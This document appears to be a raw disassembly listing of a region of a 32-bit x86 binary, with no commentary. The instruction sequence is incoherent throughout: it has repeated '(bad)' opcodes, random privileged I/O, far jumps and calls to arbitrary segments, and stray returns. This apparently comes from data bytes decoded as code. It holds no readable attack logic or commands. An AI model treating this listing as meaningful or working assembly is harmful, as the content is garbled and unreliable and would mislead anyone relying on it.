  415dea:	adc    al,dh
  415dec:	adc    esp,DWORD PTR [ecx+0x20]
  415def:	push   edi
  415df0:	popf   
  415df1:	pusha  
  415df2:	mov    ebp,DWORD PTR [ebp-0x16fa8e86]
  415df8:	inc    ebp
  415df9:	or     al,0x64
  415dfb:	mov    esp,0xbdca7957
  415e00:	ret    0xa6f
  415e03:	push   ss
  415e04:	(bad)  
  415e05:	mov    bl,0x6d
  415e07:	push   edx
  415e08:	scas   eax,DWORD PTR es:[edi]
  415e09:	inc    edi
  415e0a:	fsub   QWORD PTR [edx+0x1]
  415e0d:	adc    ebx,esp
  415e0f:	(bad)
  415e12:	call   0xd85c8984
  415e17:	mov    edx,0xc68c4d11
  415e1c:	retf   
  415e1d:	mov    eax,ds:0xf4f3ab80
  415e22:	popf   
  415e23:	mov    eax,0xfd8e07bf
  415e28:	test   BYTE PTR [eax+edi*1-0x1d],ch
  415e2c:	inc    ecx
  415e2d:	xchg   ebp,eax
  415e2e:	outs   dx,BYTE PTR ds:[esi]
  415e2f:	sub    bl,BYTE PTR [edx-0x2caaa7fa]
  415e35:	addr16 cli 
  415e37:	inc    esi
  415e38:	sub    ebp,DWORD PTR [eax]
  415e3a:	scas   eax,DWORD PTR es:[edi]
  415e3b:	jmp    FWORD PTR [esi+0x313e887d]
  415e41:	push   esi
  415e42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e43:	inc    ebp
  415e44:	push   edi
  415e45:	stos   BYTE PTR es:[edi],al
  415e46:	imul   edx,DWORD PTR [esi-0x2e],0x86d30cf1
  415e4d:	out    0x71,al
  415e4f:	xchg   esp,eax
  415e50:	nop
  415e51:	mov    eax,ds:0x17a79ac
  415e56:	scas   eax,DWORD PTR es:[edi]
  415e57:	xchg   esi,eax
  415e58:	xchg   edx,eax
  415e59:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  415e5b:	xchg   ecx,eax
  415e5c:	jmp    0x8c0e4f23
  415e61:	fwait
  415e62:	sub    ecx,DWORD PTR [ecx]
  415e64:	in     al,0xf
  415e66:	xchg   BYTE PTR [ebp+0x1a],dh
  415e69:	in     al,0x66
  415e6b:	mov    ah,0xa2
  415e6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e6e:	dec    edx
  415e6f:	inc    ebp
  415e70:	or     eax,edi
  415e72:	stos   BYTE PTR es:[edi],al
  415e73:	and    eax,0xb9053d55
  415e78:	fwait
  415e79:	mov    ebx,0xc99b7ac0
  415e7e:	sub    dh,BYTE PTR [ebx+0x6f]
  415e81:	and    ecx,DWORD PTR [ebx-0x134731e7]
  415e87:	shl    DWORD PTR [eax-0x4e16665a],0x1d
  415e8e:	jnp    0x415e71
  415e90:	dec    DWORD PTR ds:0xbaaa98f8
  415e96:	and    BYTE PTR [edi+0x39c7e10d],dl
  415e9c:	loope  0x415eaa
  415e9e:	pop    edi
  415e9f:	retf   0xb435
  415ea2:	ss mov eax,0x26b1566d
  415ea8:	push   esp
  415ea9:	rol    BYTE PTR [edx],0xc7
  415eac:	dec    esp
  415ead:	ins    BYTE PTR es:[edi],dx
  415eae:	cmc    
  415eaf:	scas   eax,DWORD PTR es:[edi]
  415eb0:	ret    0xbbb0
  415eb3:	loop   0x415edb
  415eb5:	push   edi
  415eb6:	mov    dl,0x1d
  415eb8:	xor    eax,0xfb42e884
  415ebd:	xor    DWORD PTR [ebx+edi*4-0x14928fef],esp
  415ec4:	sbb    al,0xaa
  415ec6:	loope  0x415eae
  415ec8:	daa    
  415ec9:	inc    edx
  415eca:	leave  
  415ecb:	clc    
  415ecc:	sbb    DWORD PTR [ecx],ecx
  415ece:	mov    ch,0xdb
  415ed0:	mov    cl,0xe3
  415ed2:	push   edx
  415ed3:	repnz fsub QWORD PTR [edi-0x20c0bde3]
  415eda:	fsubp  st(7),st
  415edc:	ret    
  415edd:	ja     0x415edd
  415edf:	jge    0x415efc
  415ee1:	cmp    ebp,DWORD PTR [ebx]
  415ee3:	imul   ebx,ebp,0xffffff89
  415ee6:	shl    BYTE PTR [eax],0x7b
  415ee9:	push   ebp
  415eea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415eeb:	popf   
  415eec:	test   BYTE PTR [ebx+0xe21cb2f],ch
  415ef2:	ror    DWORD PTR [esp+eax*2-0x7b8145fc],0xdc
  415efa:	jp     0x415f0a
  415efc:	(bad)  
  415efd:	mov    dl,0xb8
  415eff:	lds    edx,FWORD PTR [ebx-0x67]
  415f02:	mov    esi,0xf3fb3e09
  415f07:	leave  
  415f08:	cli    
  415f09:	sbb    edx,DWORD PTR [edi+0x41]
  415f0c:	xor    cl,BYTE PTR [ecx-0x1278fb8e]
  415f12:	jmp    0xf98dfd84
  415f17:	dec    ebp
  415f18:	mov    ecx,0xffe116ba
  415f1d:	mov    bl,0xb1
  415f1f:	xor    BYTE PTR ds:0xd55d1c73,0x32
  415f26:	cmp    DWORD PTR [esp+ecx*4-0x51],ecx
  415f2a:	pop    eax
  415f2b:	shl    BYTE PTR [ebp+0x3e2a9ad],cl
  415f31:	mov    ebx,0x27c37150
  415f36:	dec    ecx
  415f37:	push   esp
  415f38:	xchg   ecx,eax
  415f39:	loope  0x415ef8
  415f3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f3c:	and    al,0xd7
  415f3e:	adc    al,BYTE PTR [edx]
  415f40:	inc    ecx
  415f41:	add    DWORD PTR [edi-0x76],eax
  415f44:	sti    
  415f45:	push   eax
  415f46:	mov    ch,0xf3
  415f48:	pop    edi
  415f49:	and    ebp,DWORD PTR [ecx-0x6d5dc726]
  415f4f:	jp     0x415f68
  415f51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f52:	mov    bh,0xaf
  415f54:	mov    esi,0xedf8e497
  415f5a:	repnz stos DWORD PTR es:[edi],eax
  415f5c:	jmp    0x3f82:0x3c590c97
  415f63:	in     al,0xf7
  415f65:	nop
  415f66:	stos   BYTE PTR es:[edi],al
  415f67:	imul   esp,ebp,0xfffffffb
  415f6a:	dec    esp
  415f6b:	push   esi
  415f6c:	sub    al,0x6d
  415f6e:	add    esp,DWORD PTR [edx-0x4]
  415f71:	stos   DWORD PTR es:[edi],eax
  415f72:	xor    al,BYTE PTR [esi-0x49452b89]
  415f78:	xor    BYTE PTR [ecx+0x48e9d82],ch
  415f7e:	fisubr DWORD PTR [edi]
  415f80:	rol    DWORD PTR [eax],1
  415f82:	sar    BYTE PTR [ecx+0x29d86579],0x3b
  415f89:	jae    0x415fff
  415f8b:	pop    ss
  415f8c:	pop    ds
  415f8d:	fild   QWORD PTR [esi-0x64f7163b]
  415f93:	and    al,0x84
  415f95:	call   0x3715:0xd71181ed
  415f9c:	mov    fs,WORD PTR [ebx+eax*4]
  415f9f:	cs stos BYTE PTR es:[edi],al
  415fa1:	xor    eax,0x64985f
  415fa6:	mov    al,0x7
  415fa8:	pop    es
  415fa9:	xchg   esp,eax
  415faa:	aam    0xcc
  415fac:	test   DWORD PTR [edi+0x55],0x267ef8b3
  415fb3:	and    dl,dh
  415fb5:	jmp    0xc97c:0xea27dc0a
  415fbc:	out    0x84,al
  415fbe:	inc    esp
  415fbf:	and    DWORD PTR [esi],ebp
  415fc1:	scas   al,BYTE PTR es:[edi]
  415fc2:	pop    ecx
  415fc3:	outs   dx,BYTE PTR ds:[si]
  415fc5:	dec    ebx
  415fc6:	cdq    
  415fc7:	stc    
  415fc8:	in     al,0xd6
  415fca:	mov    esi,0x94d2c705
  415fcf:	loop   0x416041
  415fd1:	lods   eax,DWORD PTR ds:[esi]
  415fd2:	mov    ah,0xef
  415fd4:	stc    
  415fd5:	dec    edx
  415fd6:	(bad)  
  415fd7:	push   edi
  415fd8:	dec    esp
  415fd9:	ins    BYTE PTR es:[edi],dx
  415fda:	lods   eax,DWORD PTR ds:[esi]
  415fdb:	and    ebx,DWORD PTR [ebx-0x22]
  415fde:	es leave 
  415fe0:	lahf   
  415fe1:	in     al,dx
  415fe2:	jno    0x415ff0
  415fe4:	cmp    ch,BYTE PTR [edi+0x2d]
  415fe7:	call   0x5eac:0x25ef455b
  415fee:	mov    DWORD PTR [eax-0x50],edx
  415ff1:	ins    DWORD PTR es:[edi],dx
  415ff2:	popa   
  415ff3:	xor    DWORD PTR [esi],0xf1cbd719
  415ff9:	mov    dl,0x68
  415ffb:	dec    eax
  415ffc:	dec    ecx
  415ffd:	jecxz  0x416071
  415fff:	inc    ebx
  416000:	ja     0x41607b
  416002:	sub    cl,ch
  416004:	xchg   ebx,eax
  416005:	xchg   ebp,eax
  416006:	cs cwde 
  416008:	jmp    0x416003
  41600a:	mov    esp,0x49ca91
  41600f:	xor    BYTE PTR [edi-0x29],dh
  416012:	jle    0x416032
  416014:	ja     0x41606e
  416016:	das    
  416017:	scas   al,BYTE PTR es:[edi]
  416018:	xlat   BYTE PTR ds:[ebx]
  416019:	popa   
  41601a:	push   ecx
  41601b:	sub    DWORD PTR [ebx],0x78915299
  416021:	fsub   QWORD PTR [edi+0xc]
  416024:	pop    ds
  416025:	xchg   esp,eax
  416026:	repnz mov ds:0xda40c16c,eax
  41602c:	les    ecx,FWORD PTR [esi+0x4a]
  41602f:	jb     0x415fd8
  416031:	adc    DWORD PTR [ebx],ecx
  416033:	pop    ebp
  416034:	pop    esi
  416035:	jb     0x416076
  416037:	lock and al,0xf0
  41603a:	into   
  41603b:	ins    BYTE PTR es:[edi],dx
  41603c:	cwde   
  41603d:	dec    edi
  41603e:	add    al,0x54
  416040:	push   0x94151c7f
  416045:	mov    bl,0x70
  416047:	mov    eax,0x60ef2f50
  41604c:	leave  
  41604d:	cmp    BYTE PTR [edi-0x70],0x38
  416051:	js     0x416088
  416053:	int    0xf1
  416055:	stc    
  416056:	repz pop eax
  416058:	add    al,0x79
  41605a:	in     eax,dx
  41605b:	fild   DWORD PTR [edi-0x33b125b1]
  416061:	and    eax,0x6583b9e0
  416066:	inc    eax
  416067:	sub    ah,al
  416069:	xor    eax,0x64ab429d
  41606e:	ja     0x4160ed
  416070:	sbb    BYTE PTR [edx],0xd6
  416073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416074:	fcmovb st,st(4)
  416076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416077:	jno    0x415ffd
  416079:	xor    al,BYTE PTR [ecx+0x5a]
  41607c:	rep stos BYTE PTR es:[edi],al
  41607e:	mov    al,ds:0x598c1378
  416083:	xchg   edx,eax
  416084:	jecxz  0x4160b2
  416086:	ror    eax,0xa4
  416089:	and    ch,BYTE PTR [eax]
  41608b:	jo     0x41603f
  41608d:	jnp    0x41606f
  41608f:	imul   esp,DWORD PTR [edx+esi*1+0x63c8bfd9],0x50
  416097:	push   edi
  416098:	inc    ebx
  416099:	pop    esp
  41609a:	xor    eax,0x65a06c8e
  41609f:	mov    ch,0xe9
  4160a1:	(bad)  
  4160a2:	pusha  
  4160a3:	sub    eax,0x24cb740d
  4160a8:	fdiv   st,st(7)
  4160aa:	add    DWORD PTR [esi],0x6436b3b0
  4160b0:	push   0x772a00cb
  4160b5:	sbb    ah,dh
  4160b7:	retf   
  4160b8:	cmp    DWORD PTR [esi-0x7c],0xffffffda
  4160bc:	push   esi
  4160bd:	pop    ecx
  4160be:	xchg   DWORD PTR [edx-0x75adb000],edi
  4160c4:	mov    DWORD PTR [edi],edx
  4160c6:	dec    ebx
  4160c7:	iret   
  4160c8:	out    0x5c,al
  4160ca:	jge    0x416086
  4160cc:	fdivr  DWORD PTR [edi]
  4160ce:	push   esp
  4160cf:	push   ss
  4160d0:	cmc    
  4160d1:	jle    0x416111
  4160d3:	mov    edi,0x15c9872d
  4160d8:	mov    edi,0xe178dd75
  4160dd:	add    DWORD PTR ds:0x317def30,esp
  4160e3:	sti    
  4160e4:	mov    WORD PTR [esi-0x1eddcba0],?
  4160ea:	fsubp  st(7),st
  4160ec:	mov    dh,0x43
  4160ee:	push   es
  4160ef:	xchg   ecx,eax
  4160f0:	xor    DWORD PTR [ebp+0x524e2202],0xffffffdf
  4160f7:	repnz shr DWORD PTR [ebp-0x4],1
  4160fb:	icebp  
  4160fc:	retf   0x271e
  4160ff:	pop    esi
  416100:	pop    edi
  416101:	push   es
  416102:	sbb    eax,0x861e1c8a
  416107:	imul   BYTE PTR [esi-0x54c09bfe]
  41610d:	bound  edx,QWORD PTR [edx+eiz*2+0x50]
  416111:	outs   dx,DWORD PTR ds:[esi]
  416112:	popf   
  416113:	cmp    dh,bh
  416115:	add    DWORD PTR [esi-0x14],ebp
  416118:	lock push cs
  41611a:	or     DWORD PTR [esi+0x43],ebp
  41611d:	and    BYTE PTR [ebp-0x66],dl
  416120:	jo     0x416166
  416122:	and    eax,0x40a2e2a2
  416127:	add    ecx,DWORD PTR [esi]
  416129:	out    0x7c,eax
  41612b:	jmp    0x70124514
  416130:	not    edi
  416132:	iret   
  416133:	pop    edi
  416134:	or     DWORD PTR [edi+0x41095957],esi
  41613a:	mov    bh,0x48
  41613c:	cmp    BYTE PTR [ebx+0x2fea2225],dl
  416142:	aaa    
  416143:	mov    al,0xcd
  416145:	popa   
  416146:	jne    0x416169
  416148:	mov    al,0xac
  41614a:	jp     0x4160fd
  41614c:	stos   DWORD PTR es:[edi],eax
  41614d:	sahf   
  41614e:	call   FWORD PTR [esi+0x1b]
  416151:	std    
  416152:	shr    BYTE PTR [edx],cl
  416154:	mov    eax,0x368230e6
  416159:	jae    0x4161c6
  41615b:	jecxz  0x41614b
  41615d:	or     DWORD PTR [eax-0x49f46f3d],edx
  416163:	jle    0x416160
  416165:	cmp    eax,0x198ffb3e
  41616a:	fild   QWORD PTR [eax+0x157e8170]
  416170:	jbe    0x416181
  416172:	sbb    ecx,DWORD PTR [ebx]
  416174:	xchg   ecx,eax
  416175:	rcl    BYTE PTR [ecx+0x6e],0x3e
  416179:	inc    esi
  41617a:	scas   eax,DWORD PTR es:[edi]
  41617b:	fdivr  DWORD PTR [esi+0xaad084a]
  416181:	loopne 0x41614c
  416183:	retf   0x55d8
  416186:	test   DWORD PTR [edx+ecx*8],esi
  416189:	xor    BYTE PTR [ecx],cl
  41618b:	mov    fs,WORD PTR [ecx-0x510a748d]
  416191:	dec    ebx
  416192:	stos   DWORD PTR es:[edi],eax
  416193:	fist   WORD PTR [esi-0x10]
  416196:	scas   al,BYTE PTR es:[edi]
  416197:	sbb    DWORD PTR [ebp+0x373f3a7d],0x7e4073a8
  4161a1:	mov    ebp,0xc3c77fb8
  4161a6:	shr    edx,0x82
  4161a9:	jmp    0x714f51b3
  4161ae:	jnp    0x416155
  4161b0:	adc    eax,0xb6f970ef
  4161b5:	stos   BYTE PTR es:[edi],al
  4161b6:	icebp  
  4161b7:	shr    DWORD PTR [edi+0x34],0x86
  4161bb:	int    0x38
  4161bd:	out    dx,al
  4161be:	in     al,dx
  4161bf:	jmp    0xe04f:0x2d173fd8
  4161c6:	mov    bl,0x1e
  4161c8:	or     al,0x26
  4161ca:	fcmovnu st,st(6)
  4161cc:	xor    BYTE PTR [edi-0x201e5bcb],dh
  4161d2:	jbe    0x416185
  4161d4:	inc    esp
  4161d5:	cli    
  4161d6:	out    0xed,al
  4161d8:	fidiv  DWORD PTR [ecx]
  4161da:	mov    ebp,0x903911e1
  4161df:	setnp  BYTE PTR [edi+0x78]
  4161e3:	and    DWORD PTR [ebx+0x6b],eax
  4161e6:	push   es
  4161e7:	mov    es,WORD PTR [ebp-0x7385984c]
  4161ed:	into   
  4161ee:	(bad)  
  4161ef:	mov    edx,DWORD PTR [esi-0x133c33a8]
  4161f5:	(bad)  
  4161f6:	pop    ebx
  4161f7:	and    DWORD PTR [eax-0x72d9e111],esp
  4161fd:	sub    DWORD PTR [eax+ebx*4],ebp
  416200:	push   esp
  416201:	out    dx,eax
  416202:	xchg   ecx,ecx
  416204:	jl     0x4161ff
  416206:	adc    DWORD PTR [edi+0x4e],eax
  416209:	out    0x46,al
  41620b:	lods   al,BYTE PTR ds:[esi]
  41620c:	les    ebx,FWORD PTR [ebx]
  41620e:	aas    
  41620f:	sbb    al,0xd4
  416211:	mov    ebx,0x2cc94b04
  416216:	pop    es
  416217:	dec    ebx
  416219:	pusha  
  41621a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41621b:	push   esi
  41621c:	jmp    0x7436e4a5
  416221:	shl    DWORD PTR [edi+0x44df4026],0x2d
  416228:	cmp    esi,ebp
  41622a:	mov    esp,0x7ff51e05
  41622f:	pop    ecx
  416230:	packssdw mm5,QWORD PTR [bx+di+0x38]
  416235:	and    al,0xaa
  416237:	add    eax,0x7665d1dc
  41623c:	and    al,0xba
  41623e:	sahf   
  41623f:	outs   dx,DWORD PTR ds:[si]
  416241:	adc    al,0x61
  416243:	xor    DWORD PTR [ebx-0x79],eax
  416246:	add    BYTE PTR [edx-0x5],ah
  416249:	test   eax,0xb5a6644b
  41624e:	out    0x6c,eax
  416250:	adc    BYTE PTR [ebp+0x20],bl
  416253:	popa   
  416254:	pop    ebp
  416255:	jae    0x41620b
  416257:	arpl   WORD PTR [eax],ax
  416259:	lock jl 0x41626c
  41625c:	jge    0x41628b
  41625e:	pop    ecx
  41625f:	sbb    DWORD PTR [edi],esi
  416261:	xchg   esi,eax
  416262:	lds    ebx,FWORD PTR [ebx-0x60]
  416265:	cmc    
  416266:	xor    DWORD PTR [edx],0x12
  416269:	sbb    BYTE PTR [edx+ecx*4+0x4],0xc9
  41626e:	push   esp
  41626f:	(bad)  
  416270:	into   
  416271:	mov    ds:0xf48dfda9,eax
  416276:	cmp    ah,BYTE PTR [ecx-0x3aabcafa]
  41627c:	xor    BYTE PTR [eax],bl
  41627e:	adc    dl,ch
  416280:	es in  eax,dx
  416282:	pop    DWORD PTR [esi*1-0x4f25e32e]
  416289:	mov    esi,0x2099450a
  41628e:	jp     0x4162f6
  416290:	xor    cl,BYTE PTR [ecx+0x110972d4]
  416296:	ret    0x1cac
  416299:	sbb    edx,esi
  41629b:	cmp    BYTE PTR [edi],0xd0
  41629e:	inc    ebx
  41629f:	adc    BYTE PTR [ecx-0x23162264],dl
  4162a5:	jmp    0x73a8:0x6ceec259
  4162ac:	mov    BYTE PTR [esi+eax*8-0x6b706fb],cl
  4162b3:	push   eax
  4162b4:	sub    ch,BYTE PTR [edx+eax*8]
  4162b7:	sub    al,0x35
  4162b9:	xchg   edi,eax
  4162ba:	mov    bh,0xff
  4162bc:	das    
  4162bd:	retf   
  4162be:	add    bl,BYTE PTR [ebx-0x4]
  4162c1:	lods   eax,DWORD PTR ds:[esi]
  4162c2:	icebp  
  4162c3:	js     0x416253
  4162c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162c6:	mov    al,ds:0xaabd4e7c
  4162cb:	pusha  
  4162cc:	imul   esi,DWORD PTR [edx],0x1e
  4162cf:	mov    ebx,0x4fa65f1a
  4162d4:	fst    QWORD PTR [ebp-0x426580da]
  4162da:	test   DWORD PTR [esi],edx
  4162dc:	push   esi
  4162dd:	push   ds
  4162de:	pop    edi
  4162df:	div    bh
  4162e1:	push   ds
  4162e2:	(bad)  
  4162e3:	sar    BYTE PTR [eax-0x4c],0x9a
  4162e7:	not    BYTE PTR [eax]
  4162e9:	lods   eax,DWORD PTR ds:[esi]
  4162ea:	cli    
  4162eb:	dec    dx
  4162ed:	daa    
  4162ee:	nop
  4162ef:	stc    
  4162f0:	sbb    eax,0x6f7088b4
  4162f5:	addr16 lock mov esi,0x2e11663
  4162fc:	dec    eax
  4162fd:	pop    edi
  4162fe:	dec    esi
  4162ff:	mul    DWORD PTR [edi]
  416301:	mov    cl,0x26
  416303:	xlat   BYTE PTR ds:[ebx]
  416304:	out    0x44,al
  416306:	push   ss
  416307:	cmp    DWORD PTR [ecx+0x62109f67],esi
  41630d:	loopne 0x4162b2
  41630f:	jnp    0x41638f
  416311:	stos   DWORD PTR es:[edi],eax
  416312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416313:	fdiv   DWORD PTR [ebp-0x1e]
  416316:	lock daa 
  416318:	xor    al,0xce
  41631a:	stos   DWORD PTR es:[edi],eax
  41631b:	xor    DWORD PTR [esi+0x38],esi
  41631e:	dec    eax
  41631f:	hlt    
  416320:	mov    esi,0x606b9a82
  416325:	aaa    
  416326:	or     esp,DWORD PTR [edx-0x2]
  416329:	cdq    
  41632a:	aas    
  41632b:	loopne 0x41639c
  41632d:	push   esi
  41632e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41632f:	cmp    edx,esi
  416331:	test   DWORD PTR [eax+eax*1],eax
  416334:	cmp    al,0x59
  416336:	icebp  
  416337:	or     eax,DWORD PTR [esi+0x621e6b8d]
  41633d:	push   0xbe13b434
  416342:	out    0xf3,al
  416344:	cld    
  416345:	sub    al,0x88
  416347:	cwde   
  416348:	in     al,0x2f
  41634a:	add    eax,0x3a2779b
  41634f:	inc    eax
  416350:	stc    
  416351:	mov    WORD PTR [eax],ss
  416353:	lds    eax,FWORD PTR ds:[edx]
  416356:	mov    ebp,DWORD PTR [edi]
  416358:	out    0x52,eax
  41635a:	dec    esi
  41635b:	fimul  WORD PTR [eax-0x47ff8bd4]
  416361:	jb     0x416367
  416363:	mov    DWORD PTR [eax+0x24],0x564240e2
  41636a:	push   es
  41636b:	push   eax
  41636c:	stos   BYTE PTR es:[edi],al
  41636d:	or     edi,DWORD PTR ds:0xa268c6a5
  416373:	mov    ah,0xfb
  416375:	push   0x57
  416377:	leave  
  416378:	clc    
  416379:	sar    BYTE PTR [edi+0x5ce6951a],cl
  41637f:	pop    edx
  416380:	out    0x55,eax
  416382:	outs   dx,DWORD PTR ds:[esi]
  416383:	and    al,0xef
  416385:	lods   al,BYTE PTR ds:[esi]
  416386:	mov    esi,0x9af8044d
  41638b:	mov    ds:0xbaed8f1b,al
  416390:	push   esi
  416391:	and    dl,BYTE PTR [ecx+0x242b10ed]
  416397:	xor    eax,0xd402409
  41639d:	and    ebx,DWORD PTR [esi-0x439a830a]
  4163a3:	jmp    0x23f512f9
  4163a8:	outs   dx,DWORD PTR ds:[esi]
  4163a9:	test   eax,0xe3c37fa5
  4163ae:	imul   edi,DWORD PTR [ecx+0xfb0e71d],0xe1ab6bed
  4163b8:	call   0xdb47:0x211ce353
  4163bf:	inc    eax
  4163c0:	popf   
  4163c1:	sti    
  4163c2:	cmp    bh,BYTE PTR [ebp-0x6a]
  4163c5:	adc    DWORD PTR [ebx+0x9],0x28
  4163c9:	cmp    al,0x55
  4163cb:	mov    DWORD PTR [edi],ecx
  4163cd:	xor    eax,0x67c44b0c
  4163d2:	popf   
  4163d3:	xchg   ebp,eax
  4163d4:	push   0xffffffa7
  4163d6:	call   0x974dc5f
  4163db:	pop    eax
  4163dc:	add    eax,0xe1f2110a
  4163e1:	add    DWORD PTR [edi],eax
  4163e3:	sbb    ebp,edi
  4163e5:	sbb    BYTE PTR [eax-0x566901d1],cl
  4163eb:	inc    edi
  4163ec:	push   ebp
  4163ed:	xor    al,0x91
  4163ef:	fsubrp st(3),st
  4163f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163f3:	daa    
  4163f4:	push   edi
  4163f5:	jge    0x41642d
  4163f7:	pop    edi
  4163f9:	push   ebp
  4163fa:	sbb    eax,0x2b408623
  4163ff:	mov    bh,0x87
  416401:	leave  
  416402:	push   esp
  416403:	mov    edi,0xdc33b2a3
  416408:	cdq    
  416409:	xchg   edx,eax
  41640a:	add    eax,0xcf72cf1b
  41640f:	inc    ebp
  416410:	jge    0x4163bc
  416412:	mov    DWORD PTR [edx+eax*2+0xa],eax
  416416:	(bad)  
  416417:	fsubr  DWORD PTR [ecx+eax*8+0x5f]
  41641b:	dec    esi
  41641c:	leave  
  41641d:	sub    eax,0x72417639
  416422:	pop    ebp
  416423:	out    dx,eax
  416424:	iret   
  416425:	and    cl,0x39
  416428:	mov    ds,ebp
  41642a:	retf   
  41642b:	bnd jp 0x4163ae
  41642e:	add    esi,DWORD PTR [ecx+0x51]
  416431:	inc    ebx
  416432:	mov    eax,0xc81d351e
  416437:	cmc    
  416438:	mov    edx,0x283e1ca1
  41643d:	xchg   edx,eax
  41643e:	or     DWORD PTR [edx],ebp
  416440:	sub    BYTE PTR [eax+edi*8+0x10],dl
  416444:	das    
  416445:	lea    ecx,[esi+0x5332a342]
  41644b:	xchg   ecx,eax
  41644c:	mov    ds:0xb910b8a9,al
  416451:	int3   
  416452:	mov    ebp,0x767dce3a
  416457:	jmp    0xff2c:0x8e8aa11c
  41645e:	mov    ah,0x8
  416460:	and    DWORD PTR [ecx],0x73
  416463:	test   BYTE PTR [edi],al
  416465:	das    
  416466:	iret   
  416467:	shr    DWORD PTR [edi],0xc2
  41646a:	inc    eax
  41646b:	xor    esi,0x1c6359d8
  416471:	push   0xafeb252e
  416476:	sub    edx,DWORD PTR [edi+0x7dd4ff09]
  41647c:	xor    DWORD PTR [edi-0x28],0x8342cbc
  416483:	rcr    BYTE PTR [di-0x4e28],0x9c
  416489:	stos   DWORD PTR es:[edi],eax
  41648a:	in     al,0xed
  41648c:	pop    esi
  41648d:	leave  
  41648e:	and    eax,0xbb88e4e6
  416493:	(bad)  
  416494:	scas   eax,DWORD PTR es:[edi]
  416495:	xchg   ebp,eax
  416496:	jg     0x41649d
  416498:	xchg   edi,edx
  41649a:	adc    bl,BYTE PTR [edi+0x5b]
  41649d:	call   DWORD PTR [eax-0x10]
  4164a0:	cli    
  4164a1:	xor    ecx,eax
  4164a3:	ss cmp al,0xb5
  4164a6:	dec    eax
  4164a7:	scas   al,BYTE PTR es:[edi]
  4164a8:	mov    edi,0xb55ec9eb
  4164ad:	inc    esp
  4164ae:	es in  al,dx
  4164b0:	mov    bl,0xaf
  4164b2:	push   ebp
  4164b3:	int    0xe6
  4164b5:	fld    QWORD PTR [ebx]
  4164b7:	test   eax,0xc147d00
  4164bc:	pop    ecx
  4164bd:	adc    eax,0x1bea3ae8
  4164c2:	fldcw  WORD PTR [ebx]
  4164c4:	add    al,0xfd
  4164c6:	pop    esi
  4164c7:	call   0x9d82:0x85b5c5c4
  4164ce:	pop    edx
  4164cf:	and    BYTE PTR [edx],0x6
  4164d2:	jnp    0x41648d
  4164d4:	inc    esp
  4164d5:	mov    bl,0xc1
  4164d7:	lods   eax,DWORD PTR ds:[esi]
  4164d8:	xor    bh,bl
  4164da:	pop    eax
  4164db:	push   0xf415a863
  4164e0:	push   edx
  4164e1:	and    bh,BYTE PTR es:[eax+0x75332e81]
  4164e8:	fwait
  4164e9:	and    ch,ch
  4164eb:	mov    cl,dl
  4164ed:	add    dl,bh
  4164ef:	es jge 0x4164d5
  4164f2:	mov    ds:0x420e7279,al
  4164f7:	fwait
  4164f8:	test   BYTE PTR [edi+0x6d3ab6c1],bl
  4164fe:	sbb    DWORD PTR [esi],eax
  416500:	jmp    0x696b574f
  416505:	in     eax,0xc3
  416507:	mov    ds:0x338583f,al
  41650c:	repnz push ds
  41650e:	pop    ebp
  41650f:	fidiv  WORD PTR [ebx+0x36]
  416512:	stc    
  416513:	xor    esp,DWORD PTR [edi]
  416515:	mov    WORD PTR [ecx+0x1a367a90],?
  41651b:	mov    cl,0xe4
  41651d:	pusha  
  41651e:	jae    0x41652c
  416520:	mov    edx,0x580e0653
  416525:	fimul  WORD PTR [eax-0x61]
  416528:	aad    0xe5
  41652a:	mov    cl,0x25
  41652c:	mov    ebp,0xf95698a0
  416531:	jo     0x4164d0
  416533:	sbb    BYTE PTR [edi],0x16
  416536:	inc    ebx
  416537:	push   esi
  416538:	ror    BYTE PTR [eax+esi*2],1
  41653b:	lds    ebp,FWORD PTR ds:0xaa0485b3
  416541:	mov    dl,bl
  416543:	cdq    
  416544:	mov    ecx,0x6391f662
  416549:	hlt    
  41654a:	cld    
  41654b:	fld    st(6)
  41654d:	pop    eax
  41654e:	popf   
  41654f:	mov    ss,ecx
  416551:	mov    al,ds:0xbc84091b
  416556:	cmp    ah,BYTE PTR [ebx+0x6c3d25b1]
  41655c:	mov    ebp,edx
  41655e:	pop    edi
  41655f:	xor    ebp,DWORD PTR [edi-0x63]
  416562:	cs mov bl,0xa6
  416565:	adc    bh,bh
  416567:	(bad)  
  416568:	dec    esp
  416569:	cmp    DWORD PTR [ecx+0x1e],0x61
  41656d:	ret    0xeda2
  416570:	loope  0x41652b
  416572:	or     al,0x50
  416574:	(bad)  
  416575:	adc    esi,eax
  416577:	dec    ebx
  416578:	in     al,0x1d
  41657a:	jl     0x41656d
  41657c:	outs   dx,BYTE PTR ds:[esi]
  41657d:	jno    0x41655f
  41657f:	out    0x40,eax
  416581:	cmp    ebp,DWORD PTR [ebx-0x59]
  416584:	cmp    al,0x29
  416586:	pop    edi
  416587:	xchg   ebp,eax
  416588:	lahf   
  416589:	sub    edx,esi
  41658b:	mov    bh,0x82
  41658d:	bound  edx,QWORD PTR [edi]
  41658f:	and    bl,BYTE PTR [esi-0x64d10ad5]
  416595:	cmp    cl,al
  416597:	adc    al,al
  416599:	mov    al,ds:0xbcf2c870
  41659e:	idiv   BYTE PTR [edi-0x38]
  4165a1:	jo     0x416578
  4165a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165a4:	mov    edx,DWORD PTR [esi+0x230b66f9]
  4165aa:	mov    al,0xac
  4165ac:	sbb    eax,0xcfb97b90
  4165b1:	sbb    BYTE PTR [ebx],cl
  4165b3:	jmp    0x4165af
  4165b5:	mov    bl,0x92
  4165b7:	pop    ebp
  4165b8:	add    esp,DWORD PTR [ebp+eax*2-0x57e6a282]
  4165bf:	mov    dh,0x18
  4165c1:	mov    edx,0xeece71bf
